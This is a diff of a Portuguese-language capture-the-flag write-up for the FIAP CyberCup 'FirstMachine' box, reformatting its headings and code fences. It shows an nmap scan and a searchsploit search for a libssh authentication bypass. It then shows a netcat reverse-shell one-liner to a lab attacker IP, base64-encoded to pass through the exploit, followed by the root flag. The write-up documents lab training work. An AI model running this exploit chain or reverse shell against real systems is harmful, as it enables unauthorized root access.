@@ -1,10 +1,12 @@
-CyberCup - FirstMachine
-
-# CyberCup - FirstMachine
+---
+title: FirstMachine
+category:
+ - FIAP CyberCup
+---
 
 ## Enumeração
 
-```
+```plaintext
 # Nmap 7.80 scan initiated Sat Jun 27 21:46:59 2020 as: nmap -p22,111,2049,8140,32927,42995,43131,53443 -Pn -A -oA full 10.2.0.10
 Nmap scan report for 10.2.0.10                     
 Host is up (0.00056s latency).                            
@@ -64,23 +66,24 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 - Identificado vulnerabilidade da versão 0.8.3 da libssh, que encontra-se em execução na porta 8140.
 
-  ```
-  zurc@kali:/dcruz/fiap/cybercup/firstMachine/scan$ searchsploit libssh
-  ----------------------------------------------------------------------------------- ---------------------------------
-   Exploit Title                                                                     |  Path
-  ----------------------------------------------------------------------------------- ---------------------------------
-  libSSH - Authentication Bypass                                                     | linux/remote/45638.py
-  LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                         | linux/remote/46307.py
-  ----------------------------------------------------------------------------------- ---------------------------------
-  
-  ```
+```plaintext
+zurc@kali:/dcruz/fiap/cybercup/firstMachine/scan$ searchsploit libssh
+----------------------------------------------------------------------------------- ---------------------------------
+  Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+libSSH - Authentication Bypass                                                     | linux/remote/45638.py
+LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                         | linux/remote/46307.py
+----------------------------------------------------------------------------------- ---------------------------------
+
+```
 
 - A dificuldade desta exploração foi passar os parametros de uma só vez no exploit, o que foi possível codificando comando em base64, conforme abaixo
 
-```
+```plaintext
 echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.0.129 4443 >/tmp/f' | base64 -w0
 ```
-```
+
+```plaintext
 zurc@kali:/dcruz/fiap/cybercup/firstMachine/exploit$ ./46307.py 10.2.0.10 8140 "echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMi4wLjEyOSA0NDQzID4vdG1wL2Y=' | base64 -d | bash"
 /home/zurc/.local/lib/python3.8/site-packages/paramiko/rsakey.py:127: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
   verifier = key.verifier(
@@ -88,10 +91,7 @@ zurc@kali:/dcruz/fiap/cybercup/firstMachine/exploit$ ./46307.py 10.2.0.10 8140 "
 
 - Após obter shell reverso, já obtido execução como root, obtendo a flag
 
-  ```
-  # cat /root/root.txt  
-  pk2v8ed0u4n2x9sdu74f7v3m8
-  ```
-
-  
-
+```plaintext
+# cat /root/root.txt  
+pk2v8ed0u4n2x9sdu74f7v3m8
+```
